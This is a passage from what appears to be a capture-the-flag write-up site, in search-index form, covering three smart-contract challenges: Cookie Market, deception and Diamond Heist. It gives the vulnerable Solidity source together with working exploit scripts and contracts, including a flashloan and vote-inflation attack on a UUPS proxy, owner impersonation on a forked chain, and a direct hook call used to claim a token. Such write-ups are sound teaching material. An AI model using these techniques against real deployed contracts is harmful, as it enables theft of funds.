HTTPProvider ( conn . recvline_contains ( 'rpc' ) . decode () . split ( ' ' )[ - 1 ])) account = w3 . eth . account . from_key ( conn . recvline_contains ( 'key' ) . decode () . split ( ' ' )[ - 1 ]) deployer_addr = conn . recvline_contains ( 'contract' ) . decode () . split ( ' ' )[ - 1 ] . strip () cookie_addr = w3 . toChecksumAddress ( w3 . eth . get_storage_at ( deployer_addr , 0 ) . hex ()[ - 40 :]) cookie_abi = open ( 'cookie_abi.json' ) . read () cookie_contract = w3 . eth . contract ( address = cookie_addr , abi = cookie_abi ) market_addr = w3 . toChecksumAddress ( w3 . eth . get_storage_at ( deployer_addr , 1 ) . hex ()[ - 40 :]) market_abi = open ( 'market_abi.json' ) . read () market_contract = w3 . eth . contract ( address = market_addr , abi = market_abi ) transact ( 'market_contract.functions.onERC721Received(account.address, account.address, 0, \"\")' ) transact ( 'market_contract.functions.redeemcookies(0)' ) conn = remote ( 'challs.htsp.ro' , 9002 ) conn . sendlineafter ( 'action?' , '3' ) conn . sendlineafter ( 'uuid please:' , uuid ) conn . sendlineafter ( 'contract address please:' , deployer_addr ) conn . interactive () Flag \u00b6 X-MAS{rotten_cookies_spoil_the_market}","title":"Cookie Market"},{"location":"blockchain/cookie_market/#_1","text":"The cookie market is bustling with activity as vendors sell their festive treats and holiday shoppers rush to find the perfect cookies for their loved ones. As Santa Claus makes his way through the market, he is greeted with warm smiles and cheerful greetings from the vendors and shoppers alike. Children run up to him, excited to see the jolly old man in person, and Santa takes the time to chat with them and hear their holiday wishes. As he moves from booth to booth, Santa tastes a variety of cookies, from classic sugar cookies decorated with frosting and sprinkles, to more exotic flavors like gingerbread and spiced shortbread. He even tries his hand at decorating a few cookies himself, much to the delight of the children watching. After he has gathered all the supplies he needs, Santa thanks the vendors and shoppers for their hospitality and heads back to his workshop to begin preparing for his long journey. As he sets off, he is filled with the warmth and joy of the holiday season, knowing that he will bring a little bit of that magic to every child he visits. nc challs.htsp.ro 9002 cookie.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // SPDX-License-Identifier: MIT pragma solidity 0.8.17 ; import \"./ERC721.sol\" ; contract Cookie is ERC721 ( \"cookie\" , \"E\" ) { uint256 public cookieIDX ; address public owner ; constructor (){ cookieIDX = 0 ; } // @dev mints an cookie. Note that there are only 10 cookies in the basket. function mintcookie () external { require ( cookieIDX < 10 ); _mint ( msg . sender , cookieIDX ); cookieIDX += 1 ; } } CookieMarket.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 // SPDX-License-Identifier: MIT pragma solidity 0.8.17 ; import \"./IERC721.sol\" ; import \"./IERC721Receiver.sol\" ; contract CookieMarket is IERC721Receiver { // mapping that handles ownership of the cookies within the CookieMarket. mapping ( uint256 => address ) public canRedeemcookie ; // struct that handles the orders in the market struct sell_Order { uint256 cookie_idx_offered ; // the ERC721 idx of the \"cookie\" token. uint256 amount_eth_wanted ; // the amount of ETH the seller wants to receive for the cookie. address cookie_provider ; // the address of the seller. } // storing all the sell orders in the market. sell_Order [] public sellOrders ; // cookie IERC721 public cookie ; /** @dev cookieMarket constructor. @param _cookie ERC721 contract instance. */ constructor ( address _cookie ) { cookie = IERC721 ( _cookie ); } /** @dev Allows a buyer to buy an cookie from the cookieMarket via exhausting its subsequent sell order. @param _idx The ERC721 idx of the cookie. @param _owner The `current` owner of the cookie. */ function executeOrder ( uint256 _idx , address _owner ) external payable { require ( msg . sender != _owner , \"err: no self-exchanges allowed\" ); // find the sellOrder whose cookie_idx_offered == _idx for ( uint256 i = 0 ; i < sellOrders . length ; i ++ ) { if ( sellOrders [ i ]. cookie_idx_offered == _idx ) { // check if the _owner is the seller require ( sellOrders [ i ]. cookie_provider == _owner , \"err: _owner != seller\" ); // the cookie is for sale. // check if the msg.sender has provided enough ETH to pay for the cookie if ( msg . value >= sellOrders [ i ]. amount_eth_wanted ) { // the _owner has enough ETH to pay for the cookie // paying the seller(current owner) of the cookie ( bool sent , bytes memory data ) = _owner . call { value : msg . value }( \"\" ); require ( sent , \"err: transfer failed\" ); // transfer the ownership of the cookie from the seller to the buyer canRedeemcookie [ _idx ] = msg . sender ; // remove the sellOrder from the sellOrders array sellOrders [ i ] = sellOrders [ sellOrders . length - 1 ]; sellOrders . pop (); break ; } } } } /** @dev Function to retrieve an cookie from the market. @param _idx The index of the cookie in the market. */ function redeemcookies ( uint256 _idx ) external { // check if sender can redeem the cookie require ( canRedeemcookie [ _idx ] == msg . sender , \"err: msg.sender != owner(cookie)\" ); // approve the cookie transfer. cookie . approve ( msg . sender , _idx ); // transfer the ownership of the cookie. cookie . transferFrom ( address ( this ), msg . sender , _idx ); // remove the cookie _idx from the canRedeemcookie mapping delete canRedeemcookie [ _idx ]; } /** @dev Function to effectively add a sellOrder for your cookie on the cookieMarket. @param _cookieIDX The index of the ERC721 cookie. @param _ethWanted The amount of ETH the seller wants to receive for the cookie. */ function addSellOrder ( uint256 _cookieIDX , uint256 _ethWanted ) external { // check whether the msg.sender can sell the _cookieIDX require ( canRedeemcookie [ _cookieIDX ] == msg . sender , \"err: msg.sender != owner(cookie[_cookieIDX])\" ); // create the new sellOrder sell_Order memory newOrder ; newOrder . cookie_idx_offered = _cookieIDX ; newOrder . amount_eth_wanted = _ethWanted ; newOrder . cookie_provider = msg . sender ; sellOrders . push ( newOrder ); } /** @dev Function to effectively remove a sellOrder from the cookieMarket. @param _cookieIDX The index of the ERC721 cookie. */ function removeSellOrder ( uint256 _cookieIDX ) external { // iterate through all sellOrders for ( uint256 i = 0 ; i < sellOrders . length ; i ++ ) { // check if the sellOrder is for the _cookieIDX if ( sellOrders [ i ]. cookie_idx_offered == _cookieIDX ) { // check if the msg.sender is the owner of the cookie require ( sellOrders [ i ]. cookie_provider == msg . sender , \"err: msg.sender != cookie_provider\" ); // delete the sellOrder sellOrders [ i ] = sellOrders [ sellOrders . length - 1 ]; sellOrders . pop (); break ; } } } /** @dev Inherited from IERC721Receiver. */ function onERC721Received ( address , address _from , uint256 _tokenId , bytes calldata ) external override returns ( bytes4 ) { // we have received an cookie from its owner; mark that in the redeem mapping canRedeemcookie [ _tokenId ] = _from ; return this . onERC721Received . selector ; } }","title":"\u9898\u76ee"},{"location":"blockchain/cookie_market/#hint","text":"Retrieve the OG cookie to get the flag!","title":"Hint"},{"location":"blockchain/cookie_market/#_2","text":"\u9700\u8981\u83b7\u5f97\u7f16\u53f7 0 \u7684 cookie\uff0c\u521d\u59cb\u7531 deployer \u83b7\u5f97\u5e76\u8f6c\u7ed9\u5408\u7ea6 CookieMarket \u6839\u636e canRedeemcookie \u7684\u8bb0\u5f55\uff0c\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570 redeemcookies \u8d4e\u56de\u6307\u5b9a\u7f16\u53f7\u7684 cookie\uff0c\u76f4\u63a5\u8c03\u7528 onERC721Received \u66f4\u65b0\u7f16\u53f7\u4e3a 0 \u7684 cookie \u6240\u6709\u8005\u518d\u8d4e\u56de\u5373\u53ef \u56e0\u4e3a onERC721Received \u662f hook \u51fd\u6570\uff0c\u8d77\u521d\u5e76\u6ca1\u6709\u610f\u8bc6\u5230\u53ef\u4ee5\u88ab\u76f4\u63a5\u8c03\u7528 XD","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/cookie_market/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from web3 import Web3 from pwn import * def transact ( func , gas = 1000000 ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) conn = remote ( 'challs.htsp.ro' , 9002 ) conn . sendlineafter ( 'action?' , '1' ) uuid = conn . recvline_contains ( 'uuid' ) . decode () . split ( ' ' )[ - 1 ] . strip () w3 = Web3 ( Web3 . HTTPProvider ( conn . recvline_contains ( 'rpc' ) . decode () . split ( ' ' )[ - 1 ])) account = w3 . eth . account . from_key ( conn . recvline_contains ( 'key' ) . decode () . split ( ' ' )[ - 1 ]) deployer_addr = conn . recvline_contains ( 'contract' ) . decode () . split ( ' ' )[ - 1 ] . strip () cookie_addr = w3 . toChecksumAddress ( w3 . eth . get_storage_at ( deployer_addr , 0 ) . hex ()[ - 40 :]) cookie_abi = open ( 'cookie_abi.json' ) . read () cookie_contract = w3 . eth . contract ( address = cookie_addr , abi = cookie_abi ) market_addr = w3 . toChecksumAddress ( w3 . eth . get_storage_at ( deployer_addr , 1 ) . hex ()[ - 40 :]) market_abi = open ( 'market_abi.json' ) . read () market_contract = w3 . eth . contract ( address = market_addr , abi = market_abi ) transact ( 'market_contract.functions.onERC721Received(account.address, account.address, 0, \"\")' ) transact ( 'market_contract.functions.redeemcookies(0)' ) conn = remote ( 'challs.htsp.ro' , 9002 ) conn . sendlineafter ( 'action?' , '3' ) conn . sendlineafter ( 'uuid please:' , uuid ) conn . sendlineafter ( 'contract address please:' , deployer_addr ) conn . interactive ()","title":"Exploit"},{"location":"blockchain/cookie_market/#flag","text":"X-MAS{rotten_cookies_spoil_the_market}","title":"Flag"},{"location":"blockchain/deception/","tags":["smart contract","fake source code"],"text":"#smart contract #fake source code .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Tate doesn't want you to know the truth. Find the secret. nc deception.chal.crewc.tf 60002 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pragma solidity ^ 0.8.13 ; import \"./Deception.sol\" ; contract Setup { deception public immutable TARGET ; constructor () payable { TARGET = new deception (); } function isSolved () public view returns ( bool ) { return TARGET . solved (); } } Deception.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // Contract that has to be displayed for challenge // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.10 ; contract deception { address private owner ; bool public solved ; constructor () { owner = msg . sender ; solved = false ; } modifier onlyOwner () { require ( msg . sender == owner , \"Only owner can access\" ); _ ; } function changeOwner ( address newOwner ) onlyOwner public { owner = newOwner ; } function password () onlyOwner public view returns ( string memory ){ return \"secret\" ; } function solve ( string memory secret ) public { require ( keccak256 ( abi . encodePacked ( secret )) == 0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b , \"invalid\" ); solved = true ; } } Solution \u00b6 From the source code, if we are able to provide a secret whose keccak256 hash is equal to 0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b , then the challenge can be solved. And, the keccak256 hash of \"secret\" is exactly what we want XD However, when I called the solve() function with the argument \"secret\", the transaction kept reverting :( I suddenly realized that the secret provided in the source code is not the actual value. So, I got the bytecode and attempted to extract the password from it It's not easy to get the secret even with decompiled bytecode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 function password () public payable { require ( msg . sender == _changeOwner , Error ( 'Only owner can access' )); v0 = _SafeExp ( stor_1 , stor_4 ); require ( stor_2 , Panic ( 18 )); // division by zero if ( 76 - v0 % stor_2 ) { MEM [ MEM [ 64 ] + 32 ] = v0 % stor_2 ; v1 = v2 = MEM [ 64 ] + 64 ; } else { require (( stor_3 == stor_3 * ( v0 % stor_2 ) / ( v0 % stor_2 )) | ! ( v0 % stor_2 ), Panic ( 17 )); // arithmetic overflow or underflow require ( v0 % stor_2 , Panic ( 18 )); // division by zero MEM [ 32 + MEM [ 64 ]] = stor_3 * ( v0 % stor_2 ) / ( v0 % stor_2 ); v3 = 0x18e ( 64 + MEM [ 64 ], 32 , 30 ); v4 = _SafeAdd ( 0x616263 , stor_3 ); v5 = _SafeSub ( v4 , stor_3 ); MEM [ 32 + MEM [ 64 ]] = v5 ; v6 = 0x18e ( 64 + MEM [ 64 ], 32 , 30 ); v7 = v8 = 0 ; while ( v7 < v3 . length ) { MEM [ v7 + ( 32 + MEM [ 64 ])] = v3 [ v7 ]; v7 += 32 ; } MEM [ v3 . length + ( 32 + MEM [ 64 ])] = 0 ; v9 = v10 = 0 ; while ( v9 < v6 . length ) { MEM [ v9 + ( 32 + MEM [ 64 ] + v3 . length )] = v6 [ v9 ]; v9 += 32 ; } MEM [ v6 . length + ( 32 + MEM [ 64 ] + v3 . length )] = 0 ; v1 = v11 = v6 . length + ( 32 + MEM [ 64 ] + v3 . length ); } v12 = new array []( v1 - MEM [ 64 ] - 32 ); v13 = v14 = 0 ; while ( v13 < v1 - MEM [ 64 ] - 32 ) { MEM [ v13 + v12 . data ] = MEM [ v13 + ( MEM [ 64 ] + 32 )]; v13 += 32 ; } MEM [ v1 - MEM [ 64 ] - 32 + v12 . data ] = 0 ; return v12 ; } Why not just fork the chain and impersonate the owner to call the password() function? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 contract DeceptionTest is Test { Setup setup ; deception target ; function setUp () public { vm . createSelectFork ( vm . envString ( \"RPC_URL\" )); setup = Setup ( vm . envAddress ( \"INSTANCE_ADDR\" )); target = setup . TARGET (); } function testSolve () public { // address private owner; bytes32 slotValue = vm . load ( address ( target ), 0 ); vm . prank ( address ( uint160 ( uint256 ( slotValue )))); console . log ( \"%s\" , target . password ()); } } Call the solve() function to complete the challenge after getting the actual secret :D Flag \u00b6 crew{d0nt_tru5t_wh4t_y0u_s3e_4s5_50urc3!}","title":"deception"},{"location":"blockchain/deception/#description","text":"Tate doesn't want you to know the truth. Find the secret. nc deception.chal.crewc.tf 60002 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pragma solidity ^ 0.8.13 ; import \"./Deception.sol\" ; contract Setup { deception public immutable TARGET ; constructor () payable { TARGET = new deception (); } function isSolved () public view returns ( bool ) { return TARGET . solved (); } } Deception.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // Contract that has to be displayed for challenge // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.10 ; contract deception { address private owner ; bool public solved ; constructor () { owner = msg . sender ; solved = false ; } modifier onlyOwner () { require ( msg . sender == owner , \"Only owner can access\" ); _ ; } function changeOwner ( address newOwner ) onlyOwner public { owner = newOwner ; } function password () onlyOwner public view returns ( string memory ){ return \"secret\" ; } function solve ( string memory secret ) public { require ( keccak256 ( abi . encodePacked ( secret )) == 0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b , \"invalid\" ); solved = true ; } }","title":"Description"},{"location":"blockchain/deception/#solution","text":"From the source code, if we are able to provide a secret whose keccak256 hash is equal to 0x65462b0520ef7d3df61b9992ed3bea0c56ead753be7c8b3614e0ce01e4cac41b , then the challenge can be solved. And, the keccak256 hash of \"secret\" is exactly what we want XD However, when I called the solve() function with the argument \"secret\", the transaction kept reverting :( I suddenly realized that the secret provided in the source code is not the actual value. So, I got the bytecode and attempted to extract the password from it It's not easy to get the secret even with decompiled bytecode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 function password () public payable { require ( msg . sender == _changeOwner , Error ( 'Only owner can access' )); v0 = _SafeExp ( stor_1 , stor_4 ); require ( stor_2 , Panic ( 18 )); // division by zero if ( 76 - v0 % stor_2 ) { MEM [ MEM [ 64 ] + 32 ] = v0 % stor_2 ; v1 = v2 = MEM [ 64 ] + 64 ; } else { require (( stor_3 == stor_3 * ( v0 % stor_2 ) / ( v0 % stor_2 )) | ! ( v0 % stor_2 ), Panic ( 17 )); // arithmetic overflow or underflow require ( v0 % stor_2 , Panic ( 18 )); // division by zero MEM [ 32 + MEM [ 64 ]] = stor_3 * ( v0 % stor_2 ) / ( v0 % stor_2 ); v3 = 0x18e ( 64 + MEM [ 64 ], 32 , 30 ); v4 = _SafeAdd ( 0x616263 , stor_3 ); v5 = _SafeSub ( v4 , stor_3 ); MEM [ 32 + MEM [ 64 ]] = v5 ; v6 = 0x18e ( 64 + MEM [ 64 ], 32 , 30 ); v7 = v8 = 0 ; while ( v7 < v3 . length ) { MEM [ v7 + ( 32 + MEM [ 64 ])] = v3 [ v7 ]; v7 += 32 ; } MEM [ v3 . length + ( 32 + MEM [ 64 ])] = 0 ; v9 = v10 = 0 ; while ( v9 < v6 . length ) { MEM [ v9 + ( 32 + MEM [ 64 ] + v3 . length )] = v6 [ v9 ]; v9 += 32 ; } MEM [ v6 . length + ( 32 + MEM [ 64 ] + v3 . length )] = 0 ; v1 = v11 = v6 . length + ( 32 + MEM [ 64 ] + v3 . length ); } v12 = new array []( v1 - MEM [ 64 ] - 32 ); v13 = v14 = 0 ; while ( v13 < v1 - MEM [ 64 ] - 32 ) { MEM [ v13 + v12 . data ] = MEM [ v13 + ( MEM [ 64 ] + 32 )]; v13 += 32 ; } MEM [ v1 - MEM [ 64 ] - 32 + v12 . data ] = 0 ; return v12 ; } Why not just fork the chain and impersonate the owner to call the password() function? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 contract DeceptionTest is Test { Setup setup ; deception target ; function setUp () public { vm . createSelectFork ( vm . envString ( \"RPC_URL\" )); setup = Setup ( vm . envAddress ( \"INSTANCE_ADDR\" )); target = setup . TARGET (); } function testSolve () public { // address private owner; bytes32 slotValue = vm . load ( address ( target ), 0 ); vm . prank ( address ( uint160 ( uint256 ( slotValue )))); console . log ( \"%s\" , target . password ()); } } Call the solve() function to complete the challenge after getting the actual secret :D","title":"Solution"},{"location":"blockchain/deception/#flag","text":"crew{d0nt_tru5t_wh4t_y0u_s3e_4s5_50urc3!}","title":"Flag"},{"location":"blockchain/diamond_heist/","tags":["smart contract","solidity","flashloan","UUPS"],"text":"#smart contract #solidity #flashloan #UUPS .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Salty Pretzel Swap DAO has recently come out with their new flashloan vaults. They have deposited all of their 100 Diamonds in one of their vaults. Your mission, should you choose to accept it, is to break the vault and steal all of the diamonds. This would be one of the greatest heists of all time. This text will self-destruct in ten seconds. Good luck. nc 34.141.16.87 30200 diamond_heist_contracts.zip \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u5c06 100 Diamonds \u8f6c\u79fb\u5230 Setup \u5b9e\u4f8b 1 2 3 4 // contract Setup function isSolved () external view returns ( bool ) { return diamond . balanceOf ( address ( this )) == DIAMONDS ; } Setup \u90e8\u7f72\u540e\uff0c Vault \u7684\u4ee3\u7406\u5408\u7ea6\u6301\u6709 100 Diamonds\uff0c\u663e\u7136\u9700\u8981\u901a\u8fc7\u66f4\u65b0\u5408\u7ea6\u6765\u8fdb\u884c Diamond \u7684\u8f6c\u79fb\u64cd\u4f5c\u3002\u4e0d\u8fc7\uff0c Vault \u91c7\u7528 UUPS \u4ee3\u7406\u6a21\u5f0f\uff0c\u867d\u7136\u6ca1\u6709\u521d\u59cb\u5316\u5176\u903b\u8f91\u5408\u7ea6\uff0c\u4f46\u7531\u4e8e\u5b58\u5728 onlyProxy \u4fee\u9970\u7b26\uff0c\u65e0\u6cd5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u5347\u7ea7 1 2 3 4 5 6 7 8 9 // contract Setup constructor () { vaultFactory = new VaultFactory (); vault = vaultFactory . createVault ( keccak256 ( \"The tea in Nepal is very hot.\" )); diamond = new Diamond ( DIAMONDS ); // uint constant public DIAMONDS = 100; saltyPretzel = new SaltyPretzel (); vault . initialize ( address ( diamond ), address ( saltyPretzel )); diamond . transfer ( address ( vault ), DIAMONDS ); } \u5f53 Vault \u4ee3\u7406\u5408\u7ea6\u7684\u8c03\u7528\u8005\u4e3a owner \u6216\u4ee3\u7406\u5408\u7ea6\u81ea\u8eab\u4e14\u4ee3\u7406\u5408\u7ea6\u6301\u6709 Diamond \u7684\u6570\u91cf\u4e3a \\(0\\) \u65f6\uff0c\u5141\u8bb8\u66f4\u65b0\u5408\u7ea6\u903b\u8f91 1 2 3 4 5 // contract Vault function _authorizeUpgrade ( address ) internal override view { require ( msg . sender == owner () || msg . sender == address ( this )); require ( IERC20 ( diamond ). balanceOf ( address ( this )) == 0 ); } Vault \u4ee3\u7406\u5408\u7ea6\u7684\u6240\u6709\u8005\u4e3a Setup \uff0c\u800c Setup \u4e2d\u6ca1\u6709 transferOwnership \u76f8\u5173\u7684\u903b\u8f91\uff0c\u65e0\u6cd5\u4ee5 owner \u8eab\u4efd\u66f4\u65b0\u3002\u6ce8\u610f\u5230\u5f53\u8c03\u7528\u8005\u7684\u7968\u6570\u4e0d\u5c0f\u4e8e AUTHORITY_THRESHOLD \u65f6\uff0c\u53ef\u4ee5\u4ee5 Vault \u4ee3\u7406\u5408\u7ea6\u7684\u8eab\u4efd\u8c03\u7528 Vault \u4e2d\u7684\u4efb\u610f\u51fd\u6570 1 2 3 4 5 6 7 // contract Vault uint constant public AUTHORITY_THRESHOLD = 10 _000 ether ; function governanceCall ( bytes calldata data ) external { require ( msg . sender == owner () || saltyPretzel . getCurrentVotes ( msg . sender ) >= AUTHORITY_THRESHOLD ); ( bool success ,) = address ( this ). call ( data ); require ( success ); } \u81f3\u4e8e\u4f7f IERC20(diamond).balanceOf(address(this)) == 0 \u53ef\u4ee5\u901a\u8fc7 flashloan \u89e3\u51b3 1 2 3 4 5 6 7 8 // contract Vault function flashloan ( address token , uint amount , address receiver ) external { uint balanceBefore = IERC20 ( token ). balanceOf ( address ( this )); // \u53ea\u80fd\u501f\u7528\u4ee3\u7406\u5408\u7ea6\u6301\u6709\u7684 token IERC20 ( token ). transfer ( receiver , amount ); IERC3156FlashBorrower ( receiver ). onFlashLoan ( msg . sender , token , amount , 0 , \"\" ); uint balanceAfter = IERC20 ( token ). balanceOf ( address ( this )); require ( balanceBefore == balanceAfter ); } \u90a3\u4e48\uff0c\u63a5\u4e0b\u6765\u8003\u8651\u5982\u4f55\u83b7\u53d6\u8db3\u591f\u7684\u7968\u6570\u3002\u521d\u59cb\u53ef\u901a\u8fc7 Setup.claim() \u83b7\u5f97 SALTY_PRETZELS(100 ether) \uff0c mint \u5c06\u9996\u5148\u589e\u52a0 _to \u6301\u6709\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u968f\u540e\u589e\u52a0 _delegates[_to] \u7684\u7968\u6570\u3002\u7531\u4e8e srcRep \u4e3a address(0) \uff0c\u4e0d\u5bf9\u5176\u6267\u884c\u51cf\u5c11\u7968\u6570\u7684\u64cd\u4f5c\uff0c\u56e0\u800c\u603b\u7968\u6570\u662f\u589e\u52a0\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // contract SaltyPretzel function mint ( address _to , uint256 _amount ) public onlyOwner { _mint ( _to , _amount ); _moveDelegates ( address ( 0 ), _delegates [ _to ], _amount ); } function _moveDelegates ( address srcRep , address dstRep , uint256 amount ) internal { if ( srcRep != dstRep && amount > 0 ) { if ( srcRep != address ( 0 )) { uint32 srcRepNum = numCheckpoints [ srcRep ]; uint256 srcRepOld = srcRepNum > 0 ? checkpoints [ srcRep ][ srcRepNum - 1 ]. votes : 0 ; uint256 srcRepNew = srcRepOld - amount ; _writeCheckpoint ( srcRep , srcRepNum , srcRepOld , srcRepNew ); } if ( dstRep != address ( 0 )) { uint32 dstRepNum = numCheckpoints [ dstRep ]; uint256 dstRepOld = dstRepNum > 0 ? checkpoints [ dstRep ][ dstRepNum - 1 ]. votes : 0 ; uint256 dstRepNew = dstRepOld + amount ; _writeCheckpoint ( dstRep , dstRepNum , dstRepOld , dstRepNew ); } } } \u4ee3\u5e01 SP \u7684\u6570\u91cf\u81ea Setup.claim() \u540e\u4e0d\u518d\u53d8\u5316\uff0c _moveDelegates \u4ece address(0) \u5230\u4efb\u610f\u4e0d\u4e3a 0 \u7684\u5730\u5740\u4f3c\u4e4e\u662f\u589e\u52a0\u603b\u7968\u6570\u7684\u552f\u4e00\u65b9\u6cd5\u3002\u5f53 delegator \u521d\u6b21\u58f0\u660e delegatee \u65f6\uff0c currentDelegate \u4e3a address(0) \uff0c\u5c06\u4e3a delegatee \u589e\u52a0 balanceOf(delegator) \u7968\u3002\u90a3\u4e48\uff0c\u53ef\u4ee5\u5c06\u6301\u6709\u7684\u4ee3\u5e01\u8f6c\u79fb\u7ed9\u65b0\u7684 delegator \u518d\u7531\u5176\u8c03\u7528 delegate() \u6765\u589e\u52a0 delegatee \u7684\u7968\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // contract SaltyPretzel function delegate ( address delegatee ) external { return _delegate ( msg . sender , delegatee ); } function _delegate ( address delegator , address delegatee ) internal { address currentDelegate = _delegates [ delegator ]; uint256 delegatorBalance = balanceOf ( delegator ); _delegates [ delegator ] = delegatee ; emit DelegateChanged ( delegator , currentDelegate , delegatee ); _moveDelegates ( currentDelegate , delegatee , delegatorBalance ); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 contract HackerVault is Vault { // new implementation should also be UUPS function exploit ( address token , address setup ) external { IERC20 ( token ). transfer ( address ( setup ), 100 ); } } contract Helper { function help ( address instance ) external { SaltyPretzel ( instance ). delegate ( msg . sender ); SaltyPretzel ( instance ). transfer ( msg . sender , 100 ether ); } } contract Hack is IERC3156FlashBorrower { Setup setup ; SaltyPretzel saltyPretzel ; Vault vault ; constructor ( address instance ) { setup = Setup ( instance ); saltyPretzel = SaltyPretzel ( setup . saltyPretzel ()); vault = Vault ( setup . vault ()); } function exploit () external { saltyPretzel . delegate ( address ( this )); setup . claim (); for ( uint i = 1 ; i < 100 ; i ++ ) { Helper helper = new Helper (); saltyPretzel . transfer ( address ( helper ), 100 ether ); helper . help ( address ( saltyPretzel )); } vault . flashloan ( address ( setup . diamond ()), 100 , address ( this )); } function onFlashLoan ( address , address token , uint256 amount , uint256 , bytes calldata ) external override returns ( bytes32 ) { HackerVault hackerVault = new HackerVault (); vault . governanceCall ( abi . encodeWithSignature ( \"upgradeTo(address)\" , address ( hackerVault ) )); IERC20 ( token ). transfer ( address ( vault ), amount ); return keccak256 ( \"ERC3156FlashBorrower.onFlashLoan\" ); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from web3 import Web3 import pwn hack_abi = open ( 'hack_abi.json' ) . read () hack_bytecode = open ( 'hack_bytecode.txt' , 'r' ) . read () hackervault_abi = open ( 'hackervault_abi.json' ) . read () hackervault_bytecode = open ( 'hackervault_bytecode.txt' ) . read () setup_abi = open ( 'setup_abi.json' ) . read () def transact ( func ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : eval ( func ) . estimate_gas (), 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) conn = pwn . remote ( '34.141.16.87' , 30200 ) conn . sendlineafter ( b 'action?' , b '1' ) ticket = conn . recvline_contains ( b 'ticket' ) . decode () . split ( ' ' )[ - 1 ] . strip () w3 = Web3 ( Web3 . HTTPProvider ( conn . recvline_contains ( b 'rpc' ) . decode () . split ( ' ' )[ - 1 ])) account = w3 . eth . account . from_key ( conn . recvline_contains ( b 'key' ) . decode () . split ( ' ' )[ - 1 ]) setup_addr = conn . recvline_contains ( b 'contract' ) . decode () . split ( ' ' )[ - 1 ] . strip () setup_contract = w3 . eth . contract ( address = setup_addr , abi = setup_abi ) hack_contract = w3 . eth . contract ( abi = hack_abi , bytecode = hack_bytecode ) hack_addr = transact ( 'hack_contract.constructor(setup_addr)' ) . contractAddress hack_contract = w3 . eth . contract ( address = hack_addr , abi = hack_abi ) print ( hack_addr ) transact ( 'hack_contract.functions.exploit()' ) vault_addr = setup_contract . functions . vault () . call () diamond_addr = setup_contract . functions . diamond () . call () hackervault_contract = w3 . eth . contract ( address = vault_addr , abi = hackervault_abi ) transact ( 'hackervault_contract.functions.exploit(diamond_addr, setup_addr)' ) if setup_contract . functions . isSolved () . call (): conn = pwn . remote ( '34.141.16.87' , 30200 ) conn . sendlineafter ( b 'action?' , b 